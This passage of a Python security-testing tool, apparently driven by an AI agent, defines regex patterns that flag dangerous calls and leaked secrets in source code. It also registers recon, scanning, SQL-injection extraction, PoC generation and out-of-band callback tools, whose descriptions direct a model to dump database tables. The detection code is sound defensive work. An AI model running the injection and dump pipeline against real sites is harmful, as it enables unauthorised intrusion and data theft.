    m = re.match(r"[^=:=]+\s*[=:]\s*[\"']([^\"']+)[\"']", match_text)
    value = (m.group(1) if m else match_text).strip()
    if len(value) < 6:
        return False
    low = value.lower()
    if low in {"password", "secret", "pass", "123456", "12345678", "qwerty", "admin"}:
        return False
    return not _BAD_SECRET_RE.search(value)


# (name, severity, regex, hint) — heuristic pattern, KHÔNG phải dataflow analysis
SAST_PATTERNS: dict[str, list[tuple]] = {
    "php": [
        ("PHP RCE — eval với biến", "critical", re.compile(r"\beval\s*\(\s*\$", re.I),
         "eval() nhận biến → RCE nếu biến từ user"),
        ("PHP RCE — preg_replace /e", "critical", re.compile(r"pre[g]?_replace\s*\(\s*[\"'][^\"']*/e", re.I),
         "Modifier /e (PHP<7) → code execution"),
        ("PHP RCE — assert với biến", "high", re.compile(r"\bassert\s*\(\s*\$", re.I),
         "PHP 5: assert(string) chạy như eval — đúng kiểu expression-only PoC"),
        ("PHP RCE — create_function", "high", re.compile(r"\bcreate_function\s*\(", re.I),
         "create_function = eval ẩn"),
        ("PHP Command exec với biến", "critical", re.compile(r"\b(?:system|passthru|shell_exec|exec|proc_open|popen)\s*\(\s*\$", re.I),
         "Lệnh hệ thống nhận biến từ input"),
        ("PHP Command exec", "high", re.compile(r"\b(?:system|passthru|shell_exec|exec|proc_open|popen|pcntl_exec)\s*\(", re.I),
         "Gọi lệnh hệ thống — kiểm tra input user"),
        ("PHP LFI/RFI", "high", re.compile(r"\b(?:include|require)(?:_once)?\s*\(?\s*\$_(?:GET|POST|REQUEST|COOKIE)", re.I),
         "Include file theo input user → LFI/RFI"),
        ("PHP SSRF/LFI — file từ user", "high", re.compile(r"\b(?:file_get_contents|fopen|readfile|fpassthru|file)\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)", re.I),
         "Đọc file/URL theo input user"),
        ("PHP Object Injection", "high", re.compile(r"\bunserialize\s*\(\s*\$", re.I),
         "unserialize input user → object injection/RCE"),
        ("PHP SQLi — query nối biến", "high", re.compile(r"\b(?:mysqli?_query|pg_query|sqlite_query|query|exec|execute|prepare)\s*\([^;]*\$", re.I),
         "SQL nối biến → SQL injection"),
        ("PHP Variable overwrite", "high", re.compile(r"\bextract\s*\(\s*\$_?(?:GET|POST|REQUEST|COOKIE)", re.I),
         "extract() superglobal → ghi đè biến"),
        ("PHP Ghi file từ user", "high", re.compile(r"\b(?:file_put_contents|fwrite|fputs)\s*\([^;]*\$_(?:GET|POST|REQUEST|COOKIE)", re.I),
         "Ghi file theo input user — kiểm tra path/whitelist"),
        ("PHP Upload tùy ý", "high", re.compile(r"\b(?:move_uploaded_file|copy|rename)\s*\([^;]*\$_(?:FILES|GET|POST|REQUEST)", re.I),
         "Upload handler — kiểm tra extension (pattern banhanh.php kiểu @copy)"),
        ("PHP XSS — echo superglobal", "medium", re.compile(r"\b(?:echo|print)\s*\$_(?:GET|POST|REQUEST|COOKIE)", re.I),
         "Xuất input user không escape → XSS"),
        ("PHP Header injection", "medium", re.compile(r"\bheader\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)", re.I),
         "Header theo user — kiểm tra CRLF"),
    ],
    "python": [
        ("Python RCE — eval/exec", "high", re.compile(r"\b(?:eval|exec)\s*\(", re.I),
         "eval/exec — nếu input user → RCE"),
        ("Python Command exec", "high", re.compile(r"\bos\.system\s*\(|\bsubprocess\.(?:run|call|Popen|check_output|check_call)\s*\([^)]*shell\s*=\s*True", re.I),
         "Thực thi shell (shell=True)"),
        ("Python Deserialization", "high", re.compile(r"\bpickle\.(?:load|loads)\s*\(", re.I),
         "pickle không an toàn → RCE khi đọc dữ liệu lạ"),
        ("Python YAML unsafe", "high", re.compile(r"\byaml\.load\s*\(", re.I),
         "yaml.load cần SafeLoader — input user → RCE"),
        ("Python SSTI", "high", re.compile(r"\brender_template_string\s*\(", re.I),
         "SSTI nếu template chứa input user"),
        ("Python SQLi — interpolate", "high", re.compile(r"\b(?:execute|executemany)\s*\([^)]*%[sdif]", re.I),
         "SQL dùng % khai báo — SQL injection"),
        ("Python SQLi — f-string/format", "high", re.compile(r"\b(?:execute|executemany)\s*\([^)]*(?:f[\"']|\.format\s*\()", re.I),
         "SQL dùng f-string/format — SQL injection"),
    ],
    "javascript": [
        ("JS RCE — eval", "high", re.compile(r"\beval\s*\(|\bnew\s+Function\s*\(", re.I),
         "eval/Function — input user → code exec"),
        ("JS Command exec", "high", re.compile(r"\bchild_process\.(?:exec|execSync|spawn|fork)\s*\(", re.I),
         "Thực thi lệnh hệ thống"),
        ("JS DOM XSS — innerHTML", "medium", re.compile(r"\.innerHTML\s*=\s*[^;\"']", re.I),
         "innerHTML với biến → DOM XSS"),
        ("JS Prototype pollution", "medium", re.compile(r"(?:\[\s*(?:__proto__|prototype)\s*]|\.prototype\.|pollut)", re.I),
         "Gán __proto__/prototype — prototype pollution"),
    ],
    "java": [
        ("Java RCE — Runtime.exec", "high", re.compile(r"Runtime\.getRuntime\(\)\.exec|ProcessBuilder", re.I),
         "Thực thi lệnh hệ thống"),
        ("Java Deserialization", "high", re.compile(r"\bObjectInputStream|readObject\s*\(", re.I),
         "Deserialize không an toàn → RCE"),
        ("Java SQLi — nối chuỗi", "high", re.compile(r"\b(?:execute|executeQuery|executeUpdate)\s*\([^)]*\"\s*\+", re.I),
         "SQL nối chuỗi → SQL injection"),
    ],
}

SECRET_PATTERNS: list[tuple] = [
    ("Hardcoded credential", "high", re.compile(r"\b(?:password|passwd|pwd|pass|secret|passphrase|db[_-]?pass(?:word|wd)?|api[_-]?key|apikey|auth[_-]?token|access[_-]?key|client[_-]?secret|private[_-]?key)\s*[=:]\s*[\"'][^\"']{6,}", re.I),
     "Credential hardcode — leak nếu commit lên git"),
    ("Private key", "critical", re.compile(r"-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----"),
     "Private key trong source"),
    ("AWS Access Key", "high", re.compile(r"\bAKIA[0-9A-Z]{16}\b"), "AWS access key"),
    ("OpenAI API key", "high", re.compile(r"\bsk-[A-Za-z0-9]{20,}\b"), "OpenAI API key"),
    ("GitHub token", "high", re.compile(r"\bghp_[A-Za-z0-9]{36}\b|\bgithub_pat_[A-Za-z0-9_]{20,}\b"), "GitHub token"),
    ("Slack token", "high", re.compile(r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b"), "Slack token"),
    ("Google API key", "high", re.compile(r"\bAIza[0-9A-Za-z_-]{35}\b"), "Google API key"),
    ("JWT token", "medium", re.compile(r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b"), "JWT hardcode — kiểm tra secret bên trong"),
    ("Credential trong URL", "medium", re.compile(r"\b[a-zA-Z0-9_-]+:[^@\s/]{3,}@"), "user:pass@ trong URL"),
]


def _sast_scan(**kw):
    src = os.path.abspath(os.path.expanduser(kw["src_path"]))
    if not os.path.exists(src):
        return f"[!] Src không tồn tại: {src}"
    langs_want = [l.lower() for l in (kw.get("languages") or []) if l.lower() in SAST_PATTERNS]
    engine = (kw.get("engine") or "patterns").lower()
    max_findings = max(1, min(int(kw.get("max_findings", 150)), 1000))

    files = []
    if os.path.isfile(src):
        files.append(src)
    else:
        for root, dirs, names in os.walk(src):
            dirs[:] = [d for d in dirs if d not in SKIP_SCAN_DIRS]
            for n in names:
                if n.endswith(tuple(SKIP_SCAN_EXTS)):
                    continue
                files.append(os.path.join(root, n))
                if len(files) >= 20000:
                    break

    findings: list[tuple] = []
    total_hits = 0
    skipped_large = 0
    lang_counts: dict[str, int] = {}
    for path in files:
        try:
            with open(path, "rb") as f:
                if b"\x00" in f.read(8192):
                    continue  # binary
            size = os.path.getsize(path)
            if size > 262144:
                skipped_large += 1
            with open(path, "r", errors="replace") as f:
                lines = f.readlines(262144)
        except (OSError, UnicodeDecodeError):
            continue
        ext = os.path.splitext(path)[1].lower()
        lang = next((l for l, exts in LANG_EXT.items() if ext in exts), None)
        if lang:
            lang_counts[lang] = lang_counts.get(lang, 0) + 1
        pats = SAST_PATTERNS.get(lang, []) if lang and (not langs_want or lang in langs_want) else []
        for lineno, line in enumerate(lines, 1):
            if len(line) > 1000:
                continue
            for name, sev, rx, hint in pats:
                if rx.search(line):
                    total_hits += 1
                    if len(findings) < max_findings:
                        findings.append((sev, path, lineno, name, hint, line.strip()[:160]))
            for name, sev, rx, hint in SECRET_PATTERNS:
                m = rx.search(line)
                if not m:
                    continue
                if name == "Hardcoded credential" and not _looks_secret(m.group(0)):
                    continue
                total_hits += 1
                if len(findings) < max_findings:
                    findings.append((sev, path, lineno, name, hint, line.strip()[:160]))

    sev_rank = {"critical": 0, "high": 1, "medium": 2}
    findings.sort(key=lambda x: (sev_rank.get(x[0], 9), x[2], x[1]))
    relbase = src if os.path.isdir(src) else os.path.dirname(src)
    out = [
        f"[i] SAST scan: {src}",
        f"[i] Files={len(files)} (bỏ {skipped_large} file >256KB, bỏ binary) | "
        f"Hits={total_hits} | hiện {min(len(findings), max_findings)}/{max_findings}",
    ]
    if lang_counts:
        out.append("[i] Ngôn ngữ: " + ", ".join(f"{k}:{v}" for k, v in sorted(lang_counts.items())))
    if not findings:
        out.append("[*] Không khớp pattern nào — KHÔNG có nghĩa là sạch (pattern heuristic, không dataflow).")
    for sev, path, lineno, name, hint, snippet in findings:
        rel = os.path.relpath(path, relbase)
        out.append(f"[{sev.upper()}] {rel}:{lineno} — {name} | {hint}\n    {snippet}")
    if engine in ("semgrep", "auto") and shutil.which("semgrep"):
        out.append("\n── semgrep (p/security-audit) ──\n" + _semgrep_scan(src))
    elif engine == "semgrep":
        out.append("\n[semgrep] chưa cài → sudo apt install -y semgrep")
    if engine in ("gitleaks", "auto") and shutil.which("gitleaks"):
        out.append("\n── gitleaks ──\n" + _gitleaks_scan(src))
    elif engine == "gitleaks":
        out.append("\n[gitleaks] chưa cài → pipx install gitleaks")
    return "\n".join(out)


def _semgrep_scan(src: str) -> str:
    try:
        r = subprocess.run(["semgrep", "scan", "--config", "p/security-audit",
                            "--severity", "ERROR,WARNING", "--json", "--quiet", src],
                           capture_output=True, text=True, timeout=180)
    except subprocess.TimeoutExpired:
        return "[!] semgrep timeout 180s."
    except FileNotFoundError:
        return "[!] semgrep chưa cài."
    try:
        data = json.loads(r.stdout or "{}")
        results = data.get("results") or []
        if not results:
            return "[*] semgrep: 0 findings."
        out = [f"[semgrep] {len(results)} findings (p/security-audit, hiện 30 đầu):"]
        seen = set()
        for res in results[:60]:
            key = (res.get("path"), res.get("check_id"), (res.get("start") or {}).get("line"))
            if key in seen:
                continue
            seen.add(key)
            line = (res.get("start") or {}).get("line", "?")
            sev = ((res.get("extra") or {}).get("severity") or "?").upper()
            out.append(f"[{sev}] {res.get('path', '?')}:{line} — {res.get('check_id', '?')}")
            msg = ((res.get("extra") or {}).get("message") or "").strip().replace("\n", " ")
            if msg:
                out.append("    " + msg[:160])
        return "\n".join(out)
    except json.JSONDecodeError:
        return "[!] semgrep output không parse được."


def _gitleaks_scan(src: str) -> str:
    try:
        r = subprocess.run(["gitleaks", "dir", src, "--redact"],
                           capture_output=True, text=True, timeout=180)
    except subprocess.TimeoutExpired:
        return "[!] gitleaks timeout 180s."
    except FileNotFoundError:
        return "[!] gitleaks chưa cài."
    out = (r.stdout or "").strip() or (r.stderr or "").strip()
    return out[:4000] if out else "[*] gitleaks: 0 findings."


# ─────────────────────────────────────────
# TOOL REGISTRY
# ─────────────────────────────────────────────

TOOL_REGISTRY: list[ToolSpec] = [
    # ── Recon ──
    ToolSpec("http_probe", "GET một URL: trả status code, headers chọn lọc, snippet body.",
             {"type": "object", "properties": {"url": {"type": "string", "pattern": "^https?://"}},
              "required": ["url"]}, _http_probe, risk="safe"),
    ToolSpec("find_forms", "GET một URL rồi parse HTML để liệt kê các form (action, method, input name/type). "
             "Dùng BẮT BUỘC trước khi test SQLi qua form: model phải biết action + method + tên tham số. "
             "Không gửi dữ liệu, chỉ đọc trang (risk=safe).",
             {"type": "object", "properties": {"url": {"type": "string", "pattern": "^https?://"}},
              "required": ["url"]}, _find_forms, risk="safe"),
    ToolSpec("dns_lookup", "Tra cứu DNS A records của domain.",
             {"type": "object", "properties": {"host": {"type": "string"}},
              "required": ["host"]}, _dns_lookup, risk="safe"),
    ToolSpec("headers_recon", "HEAD request: toàn bộ response headers (server, cookies, security headers).",
             {"type": "object", "properties": {"url": {"type": "string", "pattern": "^https?://"}},
              "required": ["url"]}, _headers_recon, risk="safe"),
    ToolSpec("waf_detect", "Phát hiện WAF/CDN bằng wafw00f.",
             {"type": "object", "properties": {"url": {"type": "string", "pattern": "^https?://"}},
              "required": ["url"]}, _waf_detect, risk="safe"),
    ToolSpec("detect_cms", "Fingerprint công nghệ web bằng whatweb (CMS, framework, version).",
             {"type": "object", "properties": {"url": {"type": "string", "pattern": "^https?://"}},
              "required": ["url"]}, _detect_cms, risk="safe"),
    ToolSpec("subdomain_enum", "Enumerate subdomain bằng subfinder.",
             {"type": "object", "properties": {"domain": {"type": "string"}},
              "required": ["domain"]}, _subdomain_enum, risk="safe"),
    ToolSpec("param_discovery", "Tìm tham số ẩn trên endpoint bằng arjun.",
             {"type": "object", "properties": {"url": {"type": "string", "pattern": "^https?://"}},
              "required": ["url"]}, _param_discovery, risk="noisy"),

    # ── Active ──
    ToolSpec("nuclei_scan", "Quét lỗ hổng bằng nuclei templates (CVE, misconfig, exposures). "
             "Severity: critical,high,medium,low. Tags ví dụ: cve,rce,sqli,lfi.",
             {"type": "object",
              "properties": {"url": {"type": "string", "pattern": "^https?://"},
                             "severity": {"type": "string"},
                             "tags": {"type": "string"}},
              "required": ["url"]}, _nuclei_scan, risk="active"),
    ToolSpec("ffuf_dir", "Fuzz thư mục/file với ffuf (SecLists common.txt).",
             {"type": "object",
              "properties": {"url": {"type": "string", "pattern": "^https?://"},
                             "wordlist": {"type": "string"},
                             "extensions": {"type": "string"}},
              "required": ["url"]}, _ffuf_dir, risk="active"),
    ToolSpec("sqlmap_check", "Chạy sqlmap tự động (--batch --smart --current-user --banner).",
             {"type": "object",
              "properties": {"url": {"type": "string", "pattern": "^https?://"},
                             "data": {"type": "string"}},
              "required": ["url"]}, _sqlmap_check, risk="active"),
    ToolSpec("sqli_manual_test", "Test SQLi thủ công: phát hiện quote-differential (error-based) qua test'/test'' "
             "rồi fallback time-based (SLEEP cho mysql, WAITFOR DELAY cho mssql). "
             "Hỗ trợ GET (?param=payload) VÀ POST (method='post' + data='q=test'). "
             "engine=mysql|mssql|auto (auto đoán qua headers). Không cần baseline/delay_payload "
             "— tool tự đo. Chạy find_forms TRƯỚC để biết action/method/param đúng.",
             {"type": "object",
              "properties": {"url": {"type": "string", "pattern": "^https?://"},
                             "param": {"type": "string",
                                        "description": "Tham số cần test (vd q hoặc keyword)"},
                             "method": {"type": "string", "enum": ["get", "post"],
                                         "description": "get (mặc định) hoặc post"},
                             "data": {"type": "string",
                                       "description": "Form data khi method=post, vd 'q=test' (tham số trùng param sẽ bị inject)"},
                             "engine": {"type": "string", "enum": ["mysql", "mssql", "auto"],
                                         "description": "DB engine: mysql (SLEEP), mssql (WAITFOR DELAY), auto đoán qua headers (mặc định)"},
                             "delay": {"type": "number", "minimum": 1,
                                        "description": "Giây sleep cho time-based payload (mặc định 3)"}},
              "required": ["url", "param"]}, _sqli_manual_test, risk="active"),
    ToolSpec("sqli_blind_extract",
             "SQLi time-based blind KHÔNG sqlmap: detect & extract dữ liệu bằng Python thuần "
             "(requests + timing + binary search). Hỗ trợ query (?id=1), path injection "
             "(/search/123.html) VÀ POST form (method='post' + param + data='keyword=...'). "
             "Dùng KHI sqlmap fail hoặc không bắt được path/POST-injection. "
             "engine=mssql → error-based oracle (đọc giá trị từ lỗi 500 conversion) "
             "ưu tiên trước time-based. "
             "action=detect|version|database|user|tables|dump (tables cần --db-name tùy chọn; "
             "dump cần table + columns). Extraction chậm (~10 request/ký tự) — delay nhỏ cho "
             "nhanh, lớn cho chắc chắn.",
             {"type": "object",
              "properties": {
                  "url": {"type": "string", "pattern": "^https?://"},
                  "action": {"type": "string",
                              "enum": ["detect", "version", "database", "user", "tables", "dump"],
                              "description": "detect=chỉ xác nhận lỗ hổng; dump cần table+columns"},
                  "db_name": {"type": "string", "description": "DB name cho tables (mặc định dùng DATABASE())"},
                  "table": {"type": "string", "description": "Bảng để dump (action=dump)"},
                  "columns": {"type": "string", "description": "Cột, phân tách bằng dấu phẩy (action=dump)"},
                  "limit": {"type": "integer", "minimum": 1, "maximum": 50,
                             "description": "Số dòng tối đa khi dump"},
                  "delay": {"type": "number", "minimum": 0.5,
                             "description": "Giây SLEEP mỗi probe (mặc định 3)"},
                  "threshold": {"type": "number", "minimum": 0.7,
                                 "description": "Ngưỡng delta giây để tính TRUE (mặc định 2.5)"},
                  "max_len": {"type": "integer", "minimum": 1, "maximum": 500,
                               "description": "Độ dài tối đa của mỗi giá trị trích xuất"},
                  "engine": {"type": "string", "enum": ["mysql", "mssql"],
                              "description": "DB engine: mysql (SLEEP, mặc định) hoặc mssql (error-based oracle ưu tiên + WAITFOR DELAY)"},
                  "method": {"type": "string", "enum": ["get", "post"],
                              "description": "get (mặc định) hoặc post (form — cần param + data)"},
                  "param": {"type": "string",
                            "description": "Tham số/field cần inject (mặc định tự tìm; POST bắt buộc truyền, vd 'keyword')"},
                  "data": {"type": "string",
                           "description": "Form data khi method=post, vd 'keyword=tin+tuc'"}},
              "required": ["url"]},
             _sqli_blind_extract, risk="active"),
    ToolSpec("generate_poc",
             "Sinh POC Python khai thác SQLi time-based blind KHÔNG sqlmap "
             "(requests + SLEEP + binary search ASCII). Trả về poc_path (file tạm "
             "/tmp/aixsec-x_poc_*.py) + snippet 25 dòng (code ~6KB vượt context cap nên "
             "không trả inline). Dùng trong pipeline fallback khi sqlmap_check fail: "
             "sqli_blind_extract detect → generate_poc → poc_executor. "
             "mode=query (?id=1) | path (/search/123.html — tự giữ suffix .html khi inject). "
             "action=detect|extract (VERSION+DATABASE)|dump (cần table+columns). "
             "include_user/include_tables thêm USER()/danh sách bảng. "
             "Sau khi sinh phải GỌI poc_executor với poc_path để chạy.",
             {"type": "object",
              "properties": {
                  "url": {"type": "string", "pattern": "^https?://"},
                  "mode": {"type": "string", "enum": ["query", "path"],
                            "description": "Vị trí inject: query param số hoặc path segment số"},
                  "action": {"type": "string", "enum": ["detect", "extract", "dump"],
                              "description": "detect=chỉ xác nhận; extract=version+database; dump cần table+columns"},
                  "delay": {"type": "number", "minimum": 0.5,
                             "description": "Giây SLEEP mỗi probe (mặc định 3)"},
                  "threshold": {"type": "number", "minimum": 0.7,
                                 "description": "Ngưỡng delta giây để tính TRUE (mặc định 2.5)"},
                  "table": {"type": "string", "description": "Bảng dump khi action=dump"},
                  "columns": {"type": "string",
                               "description": "Cột dump, phân tách phẩy, khi action=dump"},
                  "include_user": {"type": "boolean", "description": "Thêm USER() vào action=extract"},
                  "include_tables": {"type": "boolean", "description": "Liệt kê bảng vào action=extract"},
                  "limit": {"type": "integer", "minimum": 1, "maximum": 50,
                             "description": "Số dòng tối đa khi dump"}},
              "required": ["url"]},
             _generate_poc, risk="safe"),
    ToolSpec("poc_executor",
             "Chạy POC Python do generate_poc sinh ra. Nhận poc_path (file aixsec-x_poc_*.py "
             "trong tempdir — validate chặt chống arbitrary file exec) hoặc poc_code "
             "(source ngắn tự viết). Dùng NGAY SAU generate_poc: "
             "{'poc_path': '<poc_path từ generate_poc>', 'timeout': 90}. "
             "Output = log chạy POC (detect/extract/dump).",
             {"type": "object",
              "properties": {
                  "poc_code": {"type": "string", "description": "Source POC (chỉ dùng khi code ngắn, tự viết)"},
                  "poc_path": {"type": "string", "description": "Đường dẫn tuyệt đối file POC từ generate_poc"},
                  "timeout": {"type": "integer", "minimum": 10, "maximum": 600,
                               "description": "Giây tối đa chạy POC (mặc định 120)"}},
              "required": []},
             _poc_executor, risk="active"),
    ToolSpec("nikto_scan", "Quét nikto (web server scanner, ồn).",
             {"type": "object", "properties": {"url": {"type": "string", "pattern": "^https?://"}},
              "required": ["url"]}, _nikto_scan, risk="noisy"),

    # ── SAST ──
    ToolSpec("sast_scan",
             "Quét static source code (file/thư mục local) tìm lỗ hổng & secret bằng pattern "
             "cho PHP/Python/JS/Java; secret scan chạy trên mọi file. "
             "engine=patterns (mặc định, không cần cài gì) | semgrep | gitleaks | auto. "
             "Kết quả là heuristic — phải xác minh thủ công.",
             {"type": "object",
              "properties": {
                  "src_path": {"type": "string",
                                "description": "Thư mục hoặc file source (phải nằm trong WEBX_SRC_DIRS)"},
                  "languages": {"type": "array", "items": {"type": "string",
                              "enum": ["php", "python", "javascript", "java"]},
                                "description": "Giới hạn pattern theo ngôn ngữ; secret vẫn quét mọi file"},
                  "max_findings": {"type": "integer", "minimum": 1, "maximum": 1000},
                  "engine": {"type": "string",
                              "enum": ["patterns", "semgrep", "gitleaks", "auto"],
                              "description": "patterns=builtin; semgrep/gitleaks cần binary; auto=patterns + engines nếu có"}},
              "required": ["src_path"]},
             _sast_scan, scope_params=("src_path",), risk="safe"),

    # ── OOB ──
    ToolSpec("oob_listener", "Chạy interactsh-client nền ~10s để nhận callback OOB "
             "(blind SSRF/XXE). Trả về log path; callback xuất hiện bất đồng bộ.",
             {"type": "object", "properties": {}}, _oob_interactsh, risk="noisy"),
]
TOOL_INDEX = {t.name: t for t in TOOL_REGISTRY}
